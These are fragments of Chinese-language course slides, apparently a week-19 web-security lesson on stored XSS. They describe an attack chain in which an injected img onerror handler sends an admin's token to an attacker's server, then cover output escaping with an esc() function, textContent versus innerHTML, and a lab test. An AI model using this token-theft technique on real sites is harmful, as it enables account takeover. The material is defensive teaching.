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19  /  100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八大進階實作專題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從教學專案到可上線系統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901 ~ 1000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參考實作：MobileShopApp（React Native + PHP + MariaDB）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八大主題：權限模型 · 履約流程 · 狀態機 · 支付分流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　　　　　金額信任 · 帳號停用 · 統一登入 · XSS 防護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從一個 admin 打天下，到六種角色各司其職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舊模型只有 customer 與 admin，中間地帶無法表達。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「能改一切」或「什麼都不能改」，沒有第三種可能。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現實團隊分工遠比這細：收款的人不該能出貨。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權限模型的演進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階段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問題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初版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只有全有或全無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本週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職責可分離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六種角色與各自的職責邊界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Users.role 的六種值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23544" y="2359152"/>
          <a:ext cx="10344607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02"/>
                <a:gridCol w="3448202"/>
                <a:gridCol w="344820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入口頁面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customer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逛商品、下單、看自己的訂單、找客服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index.html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商品／分類管理、訂單總覽、客服回覆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manager.html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訂單帳款管理：審核入帳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finance.html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warehouse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倉庫管理：出貨給物流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warehouse.html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logistics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物流管理：回報送達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logistics.html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admin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全部權限＋調整角色、停用帳號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admin.html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ENUM 擴充：既有資料只要落在新清單內就不受影響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migration.sql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'finance'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'logistics'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擴充前先確認現有值都在新清單內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MODIFY 的行為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MODIFY 會重建欄位定義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新增四值，舊值保留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預設不變，註冊仍是 customer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改完數一次，確認沒資料掉出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設計取捨：ENUM 還是獨立的 Roles 關聯表？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兩種做法的代價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ENUM（本專案）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查詢少一次 JOIN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結構單純、教學好懂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新增角色要改結構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無法動態設定權限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Roles 關聯表（正式系統）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新增角色只是 INSERT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權限可自由組合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每次驗證多一次 JOIN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結構與程式都更複雜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角色從哪裡讀？每次請求都重查資料庫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require_auth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decode_token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read_bearer_token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"登入已過期"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角色與狀態「現查」，不從權杖讀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為何不寫進權杖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先驗簽章，確認身分未被偽造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role 與 status 一起取回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多一次查詢，換降級立即生效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角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多一次查詢換什麼？停權與降級的即時性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每支需要身分的 API 都會多一次 SELECT Users。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單筆主鍵查詢，成本極低，且結果馬上被同一次請求用掉。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換來的是「管理員一按停用，對方下一個動作就被擋」。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取捨的判準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把狀態放權杖：省一次查詢，但失效最長延遲 7 天。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把狀態放資料庫：多一次查詢，失效即時。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安全性相關的狀態，一律選即時。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權限檢查的分層設計：四個函式各司其職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把「驗身分」與「驗角色」拆開，是為了讓錯誤碼能分清楚。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require_auth 只回答「你是誰」，不判斷能不能做。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require_role 才決定放行與否。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由下而上收斂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require_auth()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驗簽 + 黑名單 + 現查 role/status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require_role()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比對角色是否在允許清單內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require_staff() / require_backoffice()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常用組合的捷徑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require_role() 的實作：先驗身分，再比對角色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array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require_auth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in_array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403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"權限不足，此功能限「"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implode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 /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"」使用"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用法：財務相關端點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'finance'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兩段式檢查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第一段：你是誰（失敗回 401）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第二段：你能不能（失敗回 403）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通過才回傳使用者資料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HTTP 語意的分寸：401 與 403 不能混用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401 Unauthorized 其實是「未認證」——你是誰？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403 Forbidden 才是「已認證但無權」——我知道你是誰，但你不能做這個。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混用會讓前端無法決定該導去登入頁還是顯示錯誤。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前端的反應差異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未登入／權杖失效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清狀態，導回登入頁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403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已登入但權限不足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顯示訊息，留在原頁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資源不存在或非本人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顯示找不到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19021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端點的角色矩陣：誰能打哪一支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staff-* 端點的三層權限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23544" y="2359152"/>
          <a:ext cx="10344607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02"/>
                <a:gridCol w="3448202"/>
                <a:gridCol w="344820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允許角色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說明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/ admin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商品管理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staff-categories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/ admin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分類管理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staff-orders GET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五種後台角色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訂單佇列（以 scope 分流）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staff-orders PUT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依 order_transition_rules()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履約狀態轉換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staff-payments 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 / manager / admin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確認收款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staff-users PUT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admin only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調整角色、停用帳號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註冊不能自封角色：role 一律在 SQL 裡寫死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前端就算在 body 塞 role:'admin' 也不會生效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PASSWORD_BCRYPT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'full_name'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寫死的理由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role 是常值，不是參數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只有三個欄位來自前端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密碼在後端才做雜湊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任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40661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調整他人角色：只有 admin，且不能改自己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manager 若能升級任何人為 admin，角色分層就形同虛設。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後端另外擋下「改自己的角色」。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否則管理員手滑把自己降級，就只能下 SQL 才救得回來。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兩道保險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① 呼叫者必須是 admin（否則 403）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② 目標不能是自己（否則 409）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③ 進階：不能停用系統唯一一位啟用中的 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區塊一：六角色權限模型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實驗驗收：權限有兩層 —— 從一個真實缺陷學起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本專案真的發生過：財務點「明細」一律顯示找不到資料。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使用者回報成「ATM 轉帳才會壞」，但支付方式其實無關 —— 財務佇列只收待收款訂單，而待收款的剛好都是 ATM 與貨到付款。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根因：擁有者判斷只認 manager 與 admin，三個營運角色一個都沒加進去，於是掉進「只能看自己訂單」那條分支。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端點層其實是通的 —— 回的是 404 不是 403，正好說明問題在資料列層。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finance 登入，在佇列點任一筆的「明細」→ 應顯示完整資訊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warehouse 與 logistics 各測一次 → 同樣應該看得到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customer 帶別人的 order_id 打 API → 必須回 404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finance 打 /staff-products → 應回 403（端點層仍擋住）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62301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核心觀念轉變：訂單狀態不再表示付款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Orders.status 從此只回答一個問題：貨到哪了？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錢收到了沒有，是 Payments.status 的職責。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兩條流程獨立並行，互不干涉。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職責切分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回答什麼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由誰推進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Orders.status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履約進度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倉管 → 物流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Payments.status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付款狀態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財務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舊模型的死結：paid 同時表示兩件事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paid 表示「錢收到了」也表示「可以出貨了」。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多數情況下這樣沒問題——先付款再出貨。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但有一種商業流程剛好相反。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paid 的兩種讀法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讀法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含意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誰在乎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款項已入帳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財務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倉儲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可以揀貨出貨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83941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貨到付款是「先出貨才收錢」——同一個欄位無法表達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COD 訂單成立時錢還沒收到，但倉庫必須出貨。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若沿用舊模型，狀態該填 pending 還是 paid？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填 pending 倉管不敢出；填 paid 帳目對不上。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這不是設計偏好，是必然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只要商業流程存在「先交付後收款」，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狀態就必須拆成兩個獨立維度。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硬塞進一個欄位，兩邊都會錯。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新的履約狀態機：三個正常狀態加一個分支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訂單一成立就是 awaiting_shipment，不管錢收到沒有。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每一步由不同角色推進，形成流水線。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cancelled 可從前兩個狀態進入，並還原庫存。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履約流水線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awaiting_shipment 待出貨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訂單成立即為此狀態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shipped 已出貨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倉管交給物流公司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completed 已完成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物流回報客戶簽收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05581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ENUM 擴充的順序：先加新值，才搬得動資料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migration.sql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① 先擴充：新舊值並存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'completed'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'cancelled'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② 才搬資料：兩者都代表「還沒出貨」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順序不能顛倒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先加值，舊值暫時保留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此時兩種值都合法，UPDATE 才跑得動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順序反了會直接失敗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先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搬遷不會遺失付款資訊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有人會問：paid 搬成 awaiting_shipment，那「已付款」不就沒了？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沒有——付款狀況本來就記在 Payments.status，是另一張表。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搬的只是履約進度，兩個維度從頭到尾各自獨立。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搬遷前後對照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111"/>
                <a:gridCol w="1123111"/>
                <a:gridCol w="1123111"/>
                <a:gridCol w="112311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搬遷前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搬遷後 Orders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#101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awaiting_shipment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success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#102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pending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awaiting_shipment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pending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2722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邊界處理：沒有付款紀錄的舊訂單要補一筆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migration.sql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結帳到一半放棄的訂單沒有 Payments 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transaction_id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'ATM Transfer'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CONCAT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'LEGACY-'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total_amount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'cancelled'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EXISTS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為何要補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已取消的訂單不需要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NOT EXISTS 確保不重複補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 pending、時間 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前端配合：舊值要保留並標示，查不到就原樣顯示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ORDER_STATUS_LABEL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awaiting_shipment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'待出貨'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shipped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'已出貨'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completed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'已完成'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cancelled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'已取消'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舊制值：歷史訂單仍可能出現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pending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'待付款(舊)'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'已付款(舊)'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查不到就原樣顯示，不讓畫面空白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ORDER_STATUS_LABEL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相容性設計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舊值保留並標示「(舊)」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fallback 顯示原始字串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空白畫面比英文更難除錯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48862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索引配合：工作佇列是「篩狀態 + 排時間」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倉管頁：WHERE status='awaiting_shipment' ORDER BY created_at。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沒有複合索引的話，每翻一頁都要把整張 Orders 排序一次。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訂單量成長後，這是最先爆掉的地方。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本週新增的索引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索引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支撐哪個查詢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idx_orders_status_created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倉管／物流工作佇列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idx_payments_status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財務待收款佇列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idx_orders_created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訂單流水依時間分頁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訂單建立：一律 awaiting_shipment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📦 訂單一成立就是「待出貨」，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   不管付款收到了沒有。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total_amount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lastInsertId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常值而非變數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狀態寫死，不由前端決定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 user_id 與金額是參數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金額也是後端算的，見區塊五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70502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付款不改動訂單狀態——這是最容易寫錯的一行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❌ 舊寫法：付款成功就把訂單標成已付款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UPDATE Orders SET status='paid' WHERE order_id=?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✅ 新寫法：付款只寫 Payments，訂單不動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transaction_id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訂單留在 awaiting_shipment 等倉管處理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兩條流程脫鉤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刪掉這行是重構的核心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付款只寫自己那張表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訂單狀態由倉管／物流推進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留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重構前後的資料樣貌對照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同一筆 ATM 轉帳訂單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重構前（單一欄位）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Orders.status = pending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倉管不敢出貨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財務不知道該不該催款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資訊被壓縮成一個值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重構後（兩個維度）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Orders.status = awaiting_shipment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Payments.status = pending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倉管知道要出貨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財務知道要催款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92142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為什麼保留 pending / paid 在 ENUM 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搬完資料後，已經沒有任何一列使用這兩個值。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但仍保留在 ENUM 定義中，理由是可回溯。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萬一搬遷有誤要回滾，值還在就搬得回去。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清理時機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階段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搬遷當下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保留舊值，先確認系統運作正常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穩定數週後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再從 ENUM 移除，並更新前端標籤表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區塊二：訂單履約流程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實驗驗收：確認兩個維度確實脫鉤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下一筆 ATM 轉帳訂單，觀察兩個欄位。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預期：訂單 awaiting_shipment，付款 pending。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若訂單變成 pending 或 paid，代表舊邏輯還在。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加商品到購物車並結帳，選 ATM 轉帳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/orders?order_id=X 看完整資訊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 status = awaiting_shipment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 payment.status = pending 且 paid_at 為 null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13782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三個營運角色的單一職責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誰能推進哪一步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23544" y="2359152"/>
          <a:ext cx="1034460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02"/>
                <a:gridCol w="3448202"/>
                <a:gridCol w="344820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可做的轉換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現實動作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付款 pending → success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查到 ATM 入帳、收到現金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warehouse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 待出貨 → 已出貨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揀貨包裝、交給物流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logistics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 已出貨 → 已完成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送達並由客戶簽收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 / admin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以上全部，另可取消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後台總管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權限中樞：order_transition_rules() 一張表決定一切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order_transition_rules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'logistics'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'completed'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'completed'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'cancelled'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finance 不碰履約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資料結構即規則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鍵＝可改成什麼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值＝原本必須是什麼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回空陣列＝這個角色一步都不能走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35422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只檢查目標狀態是不夠的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假設只檢查「物流可以改成 completed」。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那麼一筆還在 awaiting_shipment、根本沒出貨的訂單，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物流可以直接標成已完成——整個跳過倉管那一關。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漏洞的本質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權限回答「你能不能做這個動作」，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但狀態機還要回答「現在是不是做這個動作的時機」。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兩者都要檢查，缺一不可。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所以要雙重檢查：目標 + 來源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$rules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order_transition_rules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① 這個角色能不能改成這個狀態？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$rules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403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"你的角色不能把訂單改為「{$status}」"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② 訂單「現在」的狀態允不允許這樣轉？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in_array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$current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$rules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"訂單目前是「{$current}」，"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"不能直接改為「{$status}」"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兩種錯誤要分開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403＝權限問題，換人來也許可以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409＝時機問題，等流程走到再說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訊息要說出「目前是什麼」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只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57063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工作佇列的設計哲學：佇列本身就是待辦清單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每個角色只看到自己該處理的那一批訂單。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處理完就會離開本佇列、進入下一關的佇列。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不需要另做「已處理」標記——狀態本身就是標記。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scope 對應的篩選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scope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WHERE 條件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finance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pay.status = 'pending'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warehouse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o.status = 'awaiting_shipment'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logistics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o.status = 'shipped'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（省略）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1=1（後台總覽）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SQL 實作：同一支端點以 scope 分流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total_amount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pay_status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scope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條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件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offset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子查詢的必要性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先挑出每張訂單「最後一筆」付款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 JOIN 回來取欄位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先進先出：最早成立的排最前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直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78703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分頁陷阱：COUNT 必須套用相同條件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很容易寫成 SELECT COUNT(*) FROM Orders 就算總數。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但那是「全部訂單」的數量，不是「這個 scope 的」數量。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結果：總頁數顯示 6 頁，翻到第 2 頁卻已經沒資料。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正確做法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COUNT 查詢要複製同一組 JOIN 與 WHERE，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只是把 SELECT 欄位換成 COUNT(*)、拿掉 ORDER BY 與 LIMIT。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這是分頁最常見的 bug。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三支頁面共用一份邏輯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三支營運頁的骨架完全相同：一張工作佇列 + 一個動作按鈕。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差異只有四項：篩選條件、動作、按鈕文字、確認訊息。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全部集中在 ops.js 的 MODES 設定物件。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共用結構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finance.html / warehouse.html / logistics.html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各自只設定 OPS_MODE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ops.js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守門 + 佇列渲染 + 動作派發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MODES 設定物件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三種角色的差異全在這裡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00343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MODES：把差異變成資料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ops.js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warehouse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scope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actionLabel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'出貨'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'/staff-orders'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confirmText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未收款時加警語 */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finance / logistics 同結構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為何不抄三份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新增角色只要加一個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動作是函式，可各自呼叫不同端點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連確認訊息都可客製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抄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介面上的體貼：倉管看得到「還沒收錢」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倉管出貨前需要知道這筆收款了沒有。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未收款的列標紅，並在確認框加警語。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但系統不強制阻擋——是否放行屬營運政策。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兩種未收款情境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支付方式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未收款是否正常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倉管該怎麼做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貨到付款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照常出貨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ATM 轉帳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不正常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先與財務確認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21983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為什麼不乾脆禁止出貨未收款訂單？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強制 vs. 提醒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系統強制阻擋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邏輯單純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貨到付款永遠出不了貨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必須為 COD 開例外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例外一多規則就失控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標示並提醒（本專案）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把判斷留給人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COD 與 ATM 都能正確處理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依賴營運紀律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介面必須把資訊講清楚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取消訂單：唯一會回頭的轉換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cancelled 可從 awaiting_shipment 或 shipped 進入。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取消時必須在同一個事務內把庫存還原。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同時把還沒入帳的付款標記為 cancelled。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取消時的連動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對象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Products.stock_quantity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把該訂單扣掉的數量加回去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Payments（pending）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標記為 cancelled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Orders.status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改為 cancelled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4362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狀態機圖：把規則畫出來給全班對答案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四個狀態、五條合法邊，其餘全部非法。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把圖畫在白板上，讓學生指出哪條邊屬於哪個角色。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能畫得出來，才代表真的懂職責分離。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五條合法轉換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到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誰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awaiting_shipment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shipped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warehouse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shipped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completed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logistics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awaiting_shipment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cancelled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shipped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cancelled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manager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區塊三：職責分離狀態機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實驗驗收：跨角色越權必須被擋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三種越權情境，預期全部失敗。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若任何一項成功，代表規則表或雙重檢查有漏。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這是本區塊最重要的驗收。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三個測試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物流對 awaiting_shipment 訂單送 completed → 409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倉管呼叫 staff-payments 確認收款 → 403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財務對訂單送 shipped → 403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正常路徑：財務→倉管→物流依序推進 → 全部成功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65264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支付方式不能讓前端自由填字串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沒有約束的話，payment_method 會被塞進各種寫法。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「信用卡」「credit card」「CreditCard」全部並存。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日後做營收報表時，同一種支付方式散成好幾類。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白名單的兩個職責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說明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不在清單內一律回 400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同時決定結算型態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PAYMENT_METHODS：一張表兼任驗證與分流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'Credit Card'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'instant'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線上授權即扣款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'Mobile Pay'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'instant'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 Pay'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'instant'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手機 App 內建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'ATM Transfer'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'deferred'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要等對方匯款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'deferred'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送達收現才算收到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array_key_exists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"不支援的支付方式"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$isInstant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'instant'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鍵值兩用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鍵＝白名單，值＝結算型態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array_key_exists 就是驗證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同一張表決定後續分流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86904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instant 與 deferred 的分野只有一個問題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結帳當下，錢真的進來了嗎？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信用卡線上授權即扣款——進來了。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ATM 轉帳要等對方去操作——還沒。貨到付款更要等送達。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兩種型態的處理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型態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Payments.status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paid_at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instant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success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當下時間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deferred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pending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NULL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狀態分流：一個三元運算決定兩個欄位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transaction_id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amount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'transaction_id'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'APP-'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'total_amount'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金額讀訂單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$isInstant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$isInstant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'Y-m-d H:i:s'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三個關鍵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金額不收前端的，讀 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狀態依型態分流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未入帳就寫 NULL，不寫假時間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單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08544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結構前提：paid_at 必須允許 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migration.sql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❌ 原本的寫法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TIMESTAMP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MySQL/MariaDB 的 TIMESTAMP 預設是 NOT NULL！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✅ 改為可空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TIMESTAMP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順便把預設狀態改成 pending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隱形的預設值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沒寫 NULL 就是 NOT NULL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 TIMESTAMP 特有的陷阱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不改的話寫入 null 會變成當下時間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未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重複送出的陷阱：延後付款訂單狀態不會變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原本的防護是「訂單必須是待付款才能建立付款」。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但延後付款的訂單一直停在 awaiting_shipment。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使用者按兩次結帳，就會產生兩筆付款紀錄。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為什麼舊防護失效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舊防護依賴「訂單狀態會變化」這個假設。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狀態拆分之後，付款不再改動訂單狀態，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這個假設就不成立了。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30184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兩道防線：應用層先查，資料庫層兜底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防線一：應用層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"這張訂單已經在等待付款，請勿重複送出"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防線二：資料庫層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uk_payments_order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為何要兩道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應用層給得出友善訊息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資料庫層擋住並發同時送出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應用層的檢查在並發下有空窗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只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財務確認收款：把 pending 改成 success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查到 ATM 入帳、或收到貨到付款現金時，財務按下確認。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動作只有一個：更新 Payments 那一列。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訂單的出貨進度完全不受影響。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確認收款做了什麼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Payments.status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success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Payments.paid_at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當下時間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Orders.status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51824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為何獨立成 staff-payments 而不是塞進 staff-orders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P.51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'staff-payments'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'finance'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只允許從 pending 往前，不做退款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"這筆付款已是「{$pay['status']}」"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'pending'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分開的理由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允許的角色與 staff-orders 不同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只准 pending → success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WHERE 再帶一次 pending 防並發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款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退款為什麼不在這裡做？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P.52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收款 vs. 退款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確認收款（本專案）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pending → success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單向、不可逆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只是承認事實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不牽涉金流操作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退款（未實作）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success → refunded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要串金流商 API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涉及對帳與手續費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需獨立的退款單據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73465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App 端的支付方式選擇：為何用膠囊而非下拉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 沒有原生的 &lt;select&gt; 元件。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用一排可點的膠囊，五個選項一眼可見。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也不必為了下拉選單多裝一個第三方套件。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PAY_OPTIONS 的欄位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必須落在後端白名單內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label / icon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畫面顯示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deferred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決定要不要顯示提示框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結帳訊息由後端決定，不由前端拼字串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即時扣款說「付款成功」，延後付款說「請完成轉帳」。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說法完全不同，若由前端各自拼接，後端改規則就要改三個地方。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所以回應直接帶 message，前端照著顯示。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回應欄位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message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直接顯示給使用者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payment_status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決定標題與圖示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order_status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供前端更新列表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95105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交易序號（transaction_id）的意義與生成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真實金流會由金流商回傳交易序號，供日後對帳與退款。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本專案模擬產生：App 端用 APP-timestamp，網頁端用 TXN-timestamp。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重點是「每筆付款都要有可追溯的識別碼」。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前綴約定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來源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格式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手機 App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APP-&lt;毫秒時戳&gt;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網頁前台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TXN-&lt;毫秒時戳&gt;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舊資料補登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LEGACY-&lt;訂單編號&gt;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區塊四：支付方式與結算分流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實驗驗收：兩種支付方式的資料差異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各結帳一次，比對資料庫實際狀態。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重點在 paid_at：即時有時間，延後是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訂單狀態兩者都應該是 awaiting_shipment。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用信用卡結帳 → payment=success, paid_at 有值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ATM 轉帳結帳 → payment=pending, paid_at=NULL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兩者的 order.status 都是 awaiting_shipment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 ATM 那筆重複送出付款 → 409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16745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攻擊情境：把 price 改成 1，用一元買走筆電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攻擊者用抓包工具攔下結帳請求，改掉 body 再放行。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這不需要高深技術，瀏覽器 DevTools 就做得到。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問題不在他能改，而在後端是否採信。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被竄改的欄位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竄改後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items[0].price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49900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total_amount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49900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錯誤做法與正確做法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P.58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訂單金額從哪裡來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採信前端（錯）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直接寫入送來的 items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total_amount 照單全收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等於讓買家自己開發票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改個數字就能低價成交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後端自算（對）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完全忽略前端的 items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改讀資料庫的購物車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價格取自 Products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前端改什麼都沒用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38385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後端自己組單：從購物車讀，不從請求讀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P.59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stock_quantity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user_id 來自權杖，不是請求參數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價格來自 Products，不是請求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兩個來源都在後端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購物車內容以資料庫為準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身分來自權杖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價格來自商品表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明細寫入：price_at_purchase 取自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P.60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'quantity'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明細的成交單價也取自資料庫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← 不是 $input 的 price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歷史快照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總額由後端迴圈加總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成交單價當下寫死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日後調價不影響已成立訂單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60025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完全不理前端金額的副作用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P.61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使用者畫面顯示 $3580，實際被扣 $3600。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原因：他停在結帳頁時，商家剛好調了價。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從使用者角度看，這像是被偷扣款。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安全與體驗的衝突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「後端說了算」在安全上完全正確，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但直接扣款會讓使用者覺得被騙。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需要一個既安全又不失禮的折衷。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折衷：expected_total 是「檢查」不是「依據」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P.62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'expected_total'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'expected_total'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"商品價格已變動，最新金額為 $"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fmt_money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 TWD，請重新確認"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"total_amount"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關鍵在「不採用」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只拿來比對，不拿來計價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不一致就中止，不是改用它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回傳正確金額讓前端更新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竄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8166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為何用 0.001 的容差而不是直接比較？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金額在 JS 是浮點數，在 PHP 讀出來是字串轉 float。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3580.00 與 3580.0000001 在二進位浮點下可能不相等。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用容差比較，避免因為表示法差異而誤判成竄改。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浮點比較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寫法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問題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$a == $b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浮點誤差會誤判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abs($a-$b) &gt; 0.001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容忍表示法差異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付款端同理：amount 也不收前端的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/payments 不接收 amount 參數。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後端直接讀 Orders.total_amount。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同時確認這張訂單是本人的、且尚未付款。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付款端的三道檢查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檢查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失敗回應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支付方式在白名單內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訂單存在且屬於本人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404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尚未有付款紀錄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03306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信任邊界的完整圖像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把「可以相信」與「不能相信」畫成一條線。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線的外側全部要驗證，線的內側才能直接使用。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身分、金額、商品內容，全部在外側。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由外而內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前端送來的（不可信）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支付方式代碼、expected_total、購物車操作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白名單、權杖解身分、擁有者比對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資料庫（可信）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價格、庫存、購物車內容、訂單金額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哪些欄位「可以」讓前端決定？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不是所有輸入都要拒絕——要分清楚哪些是「意圖」哪些是「事實」。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意圖可以由前端表達：我要買什麼、用什麼方式付。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事實必須由後端決定：多少錢、庫存夠不夠、我是誰。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分類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類型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例子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誰決定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意圖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product_id、quantity、payment_method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前端提出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事實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price、total、user_id、status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後端決定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24946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同樣的原則也適用於其他欄位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P.67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註冊時的 role 寫死 customer——身分是事實。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評價的 user_id 來自權杖——作者是事實。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聊天訊息的 sender_id 來自權杖——寄件者是事實。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全站一致的做法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被無視的前端欄位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/users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/reviews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user_id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/messages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sender_id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/orders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items、total_amount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區塊五：金額信任邊界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實驗驗收：竄改金額必須失敗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用工具把 expected_total 改成 1 送出。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預期：409 並回傳正確金額，訂單不成立。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若成交，代表後端還在採信前端數字。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正常結帳一次，記下正確金額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重新加入購物車，攔截請求把 expected_total 改成 1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確認回 409 且訊息含正確金額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 Orders 沒有新增任何一列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46586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需求：停掉一個帳號，但不能刪除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P.69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客戶違規、員工離職，都需要讓帳號無法登入。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但訂單、評價、聊天記錄都是營運紀錄，必須保留。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所以要的是「停用」而不是「刪除」。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兩者的差別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可逆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停用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全部保留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可隨時重啟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連帶消失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不可逆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刪除的代價：外鍵會連坐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的外鍵多半是 ON DELETE CASCADE。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刪一個人，他的訂單、購物車、評價、聊天記錄全部跟著消失。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那不只是使用者的資料，也是公司的營運與財務紀錄。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會被帶走的資料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Orders 與 Order_Items（含已完成的交易）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Payments（財務憑證）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Reviews、Cart、Chat_Rooms、Messages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68226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方案：新增 Users.status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P.71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migration.sql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'active'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'suspended'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'active'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AFTER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既有會員自動全部 active，行為完全不變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為何有預設值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NOT NULL + DEFAULT 讓既有列自動填值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放在 role 後面，語意相鄰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加完數一次確認全是 active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加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最容易做錯的地方：只在登入時檢查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直覺寫法：登入時發現 suspended 就拒發權杖。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看起來合理，實際上有一個大洞。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已經登入的人，手上那張權杖還能用最多 7 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漏洞的規模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管理員按下「停用」之後，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對方仍可正常下單、發言、查看資料，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最長可達權杖的整個有效期——停用形同虛設。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89866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正確位置：放進 require_auth()，每次請求現查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P.73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驗簽通過之後，取回這個人的最新狀態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'active'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'active'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403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"此帳號已被停用，請聯繫系統管理員"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"ACCOUNT_SUSPENDED"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即時生效的關鍵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status 與 role 同一次查詢取回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每次請求都檢查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第三個參數是機器可讀的代碼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這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正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前端如何分辨？403 有兩種意思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帳號停用回 403，權限不足也回 403。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但前端的反應完全不同：前者要登出，後者只要顯示訊息。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所以回應多帶一個機器可讀的 code。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為何不比對訊息文字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做法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問題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比對中文訊息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訊息改個字前端就壞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比對 code 常數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訊息可自由調整，程式不受影響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11507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前端的集中處理：401 與停用走同一條路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P.75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兩者都代表「這個登入階段已經不能用了」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'ACCOUNT_SUSPENDED'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setAuthToken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onUnauthorized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Router 註冊的回呼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'登入已過期'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放在請求層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401＝權杖失效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停用＝帳號不能用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統一導回登入頁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放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保險絲：不能停用自己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管理員手滑停用自己，就再也進不了後台。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只能直接下 SQL 才救得回來——對非技術人員是災難。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所以後端明確擋下這個操作。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相關的保護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規則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不能停用自己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不能改自己的角色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409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不能停用唯一啟用中的 admin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409（防禦性）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33147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停用 vs. 權杖撤銷：兩個不同的機制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P.77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作用範圍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停用帳號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針對「人」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所有裝置立即失效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可重啟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狀態存在 Users.status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撤銷權杖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針對「一張權杖」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只影響那一次登入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登出即用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紀錄存在 Revoked_Tokens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區塊六：帳號停用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實驗驗收：同一張權杖必須立刻失效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P.78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重點在「不必等權杖過期」。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測試時務必保留停用前拿到的那張權杖。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若停用後它還能用，代表檢查放錯位置了。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 登入取得權杖，用它成功讀一次購物車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admin 在後台停用 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用「同一張」權杖再讀購物車 → 403 ACCOUNT_SUSPENDED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重啟 A 之後，A 需重新登入才能使用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54787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問題浮現：六種角色，六個入口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P.79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每一支網頁都各自帶一份登入表單與驗證邏輯。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同樣的程式碼維護好幾份，改一處要記得改全部。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而且每頁都要自己判斷「這個角色能不能進來」。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重複的內容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項目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重複幾份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登入表單 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驗證與存權杖邏輯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角色判斷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解法：抽離成單一入口，其餘只負責守門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login.html 是唯一有登入表單的頁面。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其他頁面降級成「檢查你能不能待在這裡」。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使用者只需要記住一個網址。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職責重新分配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頁面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login.html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登入、註冊、連線設定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其餘六頁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守門 + 該角色的功能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76427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關鍵設計：導向哪一頁由後端決定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P.81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home_page_for_role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'manager.html'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'finance'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'finance.html'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'warehouse.html'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'logistics'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'logistics.html'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'index.html'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路由表只有一份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角色到頁面的唯一對照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customer 走 default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新增角色只要加一個 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放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登入回應與 GET /users 都帶 home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登入回應的 home：告訴你登入後該去哪。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/users 的 home：告訴各頁「你其實該在哪一頁」。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同一個函式算出來，兩處必然一致。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兩個使用時機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登入成功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location.replace(data.home)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開頁守門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角色不符時導向 me.home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98067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守門的三種情況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每一支後台頁面開啟時都跑同一段檢查。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沒有權杖、角色不符、權杖失效，各有不同處置。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共通點：都不會讓使用者看到不該看的畫面。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檢查順序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沒有權杖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直接導向 login.html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角色不符本頁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導向後端指定的 me.home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權杖過期或帳號停用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帶 reason 導回 login.html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守門的實作：一段程式碼服務所有頁面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P.84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backoffice.js / ops.js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bounceToLogin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'/users'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REQUIRED_ROLE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走錯門就送去對的那一頁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location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home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LOGIN_PAGE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'?reason=denied'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showApp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401 已在 api() 內處理 */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導向而非報錯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角色不符不是錯誤，是走錯門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直接送到對的頁面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確認無誤才顯示畫面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19708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實作細節一：權杖鍵名必須統一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重構前前台用 shop_customer_token，後台用 shop_token。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登入頁只能寫進一個鍵，另一邊就讀不到。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這是抽離登入時第一個會撞到的問題。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統一之後的副作用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同一個瀏覽器同時只會有一個登入身分。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這正是單一登入應有的行為，不是缺陷。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要同時測兩個角色，請用不同瀏覽器或無痕視窗。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實作細節二：無限跳轉陷阱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P.86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登入頁開啟時若發現有效權杖，會自動把你送去 home。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被踢出來時若沒帶原因，登入頁又會把你送回去。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結果：兩頁之間無限彈跳，完全無法登入。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解法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被踢出時一律帶 reason 參數。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登入頁看到 reason 就跳過自動導向，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並顯示登入已過期或帳號已停用的原因。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41348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reason 的四種值與對應訊息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P.87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為什麼被送回登入頁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23544" y="2359152"/>
          <a:ext cx="1034460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02"/>
                <a:gridCol w="3448202"/>
                <a:gridCol w="344820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reason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情境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顯示訊息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expired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權杖過期或無效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登入已過期，請重新登入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suspended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帳號被停用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此帳號已被停用，請聯繫系統管理員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logout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使用者主動登出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已登出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denied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角色無法使用該頁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你的角色沒有權限使用該頁面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登出：先撤銷再清本機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P.88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ops.js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doLogout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不等結果，本機已經清掉了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API_URL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'/users?action=logout'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'Bearer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bounceToLogin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'logout'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 await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登出失敗不該卡住畫面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catch 吞掉錯誤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本機狀態一定會被清掉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就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算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62988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前端守門不是安全機制，再強調一次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P.89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所有守門邏輯都跑在使用者的瀏覽器裡。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用開發者工具把 display:none 改掉，畫面就出來了。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但那只是看到版面，任何資料都要打 API 才拿得到。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真正的邊界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層級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作用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前端守門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體驗：不讓看不懂的畫面出現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後端驗證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安全：拿工具打 API 一樣 401 或 403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區塊七：統一登入導向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實驗驗收：走錯門會被送到對的地方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重點是導向而不是報錯。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使用者不該卡在空白頁或錯誤訊息。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另外要驗證不會發生無限跳轉。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finance 登入，網址列直接開 warehouse.html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確認被自動導回 finance.html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登出後直接開 admin.html，應導向 login.html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確認登入頁停住不動，沒有來回彈跳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84628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風險來源：後台把客戶輸入塞進 innerHTML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P.91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客服聊天訊息、商品名稱、會員姓名，全都是使用者輸入。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後台為了組合表格與標籤，大量使用 innerHTML 拼接字串。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只要有一處沒跳脫，整個後台就是攻擊面。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哪些欄位來自使用者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來源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顯示在哪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聊天訊息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客服中心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會員姓名與信箱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會員清單、訂單列表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商品名稱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商品管理、訂單明細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儲存型 XSS：不需要誘導點擊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反射型 XSS 要騙受害者點一條特製網址。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儲存型不用，惡意內容先存進資料庫，之後每個看到它的人都中招。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在後台場景中，看到它的人就是管理員。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兩種 XSS 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1497482"/>
                <a:gridCol w="149748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類型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觸發方式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影響範圍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反射型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點擊特製連結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被騙的那個人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儲存型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正常瀏覽即觸發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所有看到的人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06268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具體攻擊：客戶在客服對話送出一段標籤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P.93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攻擊者的輸入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客戶在聊天輸入框打這一段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&lt;img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onerror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'https://attacker.example/steal?t='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localStorage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shop_token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後端正常寫入 Messages 資料表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對後端而言這只是一段普通文字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為何後端不擋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src=x 一定載入失敗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失敗就觸發 onerror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後端無法可靠判斷什麼是惡意文字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端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引爆時機：管理員一開後台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那段 onerror 是在管理員的瀏覽器裡執行的。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它擁有管理員的同源權限，能讀 localStorage。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而管理員的權杖就存在那裡。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04288"/>
            <a:ext cx="4967935" cy="3291839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487168"/>
